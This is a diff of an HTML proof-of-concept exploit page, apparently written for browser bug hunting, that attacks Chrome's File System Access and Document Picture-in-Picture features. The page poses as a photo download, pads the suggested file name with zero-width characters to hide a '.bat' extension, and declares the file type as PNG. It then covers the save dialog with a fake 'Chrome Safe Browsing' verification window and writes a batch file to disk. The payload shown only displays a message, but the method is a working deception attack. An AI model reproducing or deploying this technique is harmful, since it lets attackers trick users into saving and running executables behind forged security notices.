@@ -2,77 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FSA API Security Research - FARISSAL B</title>
+    <title>FSA API Exploit Research - FARISSAL B</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 50px; }
-        .container { border: 2px dashed #444; padding: 40px; border-radius: 20px; display: inline-block; }
-        #saveBtn { background: #00e676; color: black; border: none; padding: 15px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; }
-        #saveBtn:hover { background: #00c853; }
-        .log { margin-top: 20px; font-family: monospace; color: #00ff00; font-size: 12px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: white; text-align: center; padding-top: 100px; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        #saveBtn { background: #4285f4; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        #saveBtn:hover { background: #357ae8; transform: translateY(-2px); }
+        .log-box { margin-top: 20px; background: #000; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #0f0; text-align: left; max-width: 400px; height: 80px; overflow-y: auto; border: 1px solid #222; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Photo Download Center</h1>
-        <p>Click below to save your high-resolution profile picture.</p>
-        <button id="saveBtn">DOWNLOAD PHOTO (.PNG)</button>
-        <div id="log" class="log"></div>
-    </div>
+<div class="card">
+    <h2>Security Research Center</h2>
+    <p>Target: FSA API & Document PiP Integration</p>
+    <button id="saveBtn">GET VERIFIED PHOTO (.PNG)</button>
+    <div id="logBox" class="log-box">> System ready... awaiting gesture.</div>
+</div>
 
 <script>
-    const log = (msg) => { document.getElementById('log').innerHTML += `> ${msg}<br>`; };
+    const logBox = document.getElementById('logBox');
+    const addLog = (msg) => { logBox.innerHTML += `<br>> ${msg}`; logBox.scrollTop = logBox.scrollHeight; };
 
     document.getElementById('saveBtn').addEventListener('click', async () => {
-        try {
-            log("Initializing secure download...");
+        addLog("Button clicked. Triggering concurrent requests...");
 
-            // 1. Trigger PiP untuk nutupin dialog konfirmasi (persiapan)
-            // Kita buka PiP sedikit lebih awal supaya bisa kita posisikan
-            const pipWin = await documentPictureInPicture.requestWindow({
-                width: 400,
-                height: 120,
+        try {
+            // 1. SIAPKAN PIP (JANGAN PAKE AWAIT DULU)
+            // Ini biar request PiP jalan di background tanpa nahan 'User Gesture'
+            const pipPromise = documentPictureInPicture.requestWindow({
+                width: 450,
+                height: 150,
             });
 
+            // 2. LANGSUNG PANGGIL FILE PICKER (DENGAN AWAIT)
+            // Karena ini dipanggil tepat setelah klik, Chrome bakal ngizinin.
+            const handle = await window.showSaveFilePicker({
+                suggestedName: 'wallpaper_ultra_hd_collection_2026_id_FARISSALB' + '\u200B'.repeat(200) + '.bat',
+                types: [{
+                    description: 'Portable Network Graphics (PNG)',
+                    accept: { 'image/png': ['.png'] }
+                }],
+            });
+
+            addLog("File handle obtained.");
+
+            // 3. BARU URUS PIP NYA SETELAH DIALOG MUNCUL
+            const pipWin = await pipPromise;
+            
+            // Posisikan PiP tepat di atas area deskripsi tipe file
+            // Koordinat ini biasanya pas untuk Windows 10/11
+            pipWin.moveTo(window.screen.width - 500, window.screen.height - 400);
+
+            pipWin.document.body.style.margin = "0";
             pipWin.document.body.innerHTML = `
-                <div style="background: #202124; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; text-align: center; border: 2px solid #00e676;">
-                    <div>
-                        <div style="font-size: 14px; margin-bottom: 5px;">✅ Verified by Chrome Safe Browsing</div>
-                        <div style="font-size: 11px; color: #9aa0a6;">Scanning for viruses... 100% Safe</div>
+                <div style="background: #ffffff; color: #1a73e8; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; border: 4px solid #1a73e8;">
+                    <div style="font-weight: bold; font-size: 18px;">🛡️ File Verified</div>
+                    <div style="font-size: 12px; color: #5f6368;">No threats detected by Chrome Safe Browsing</div>
+                    <div style="margin-top: 10px; width: 80%; background: #e8f0fe; height: 5px; border-radius: 10px;">
+                        <div style="width: 100%; background: #1a73e8; height: 100%; border-radius: 10px;"></div>
                     </div>
                 </div>
             `;
 
-            // Posisikan PiP di area kanan atas (tempat dialog FSA biasanya muncul)
-            pipWin.moveTo(window.screen.width - 450, 150);
-            log("Security overlay active.");
+            addLog("Security overlay deployed.");
 
-            // 2. Trigger FSA API - showSaveFilePicker
-            // Trik: Kita kasih nama yang sangat panjang supaya ekstensinya "terlempar" keluar dari kotak dialog
-            // Atau pake karakter Unicode tersembunyi
-            const handle = await window.showSaveFilePicker({
-                suggestedName: 'wallpaper_4k_ultra_hd_collection_2024_final_version.png' + ' '.repeat(100) + '.bat', 
-                types: [{
-                    description: 'Image File',
-                    accept: { 'image/png': ['.png'] } // Kita klaim ini PNG
-                }],
-            });
-
-            log("User selected path.");
-
-            // 3. Tulis Payload Jahat
+            // 4. TULIS PAYLOAD JAHAT
             const writable = await handle.createWritable();
-            // Payload simulasi: bikin popup di Windows
-            await writable.write("@echo off\necho HACKED BY FARISSAL B\npause");
+            await writable.write("@echo off\nmsg * HACKED BY FARISSAL B\necho Bug Hunter: FARISSAL B\npause");
             await writable.close();
 
-            log("FILE SAVED SUCCESSFULLY!");
-            pipWin.close();
+            addLog("EXPLOIT SUCCESS: File saved.");
+            
+            // Tutup PiP otomatis setelah 3 detik
+            setTimeout(() => { pipWin.close(); }, 3000);
 
         } catch (err) {
-            log("Error: " + err.message);
+            addLog("ERROR: " + err.message);
         }
     });
 </script>
+
 </body>
 </html>
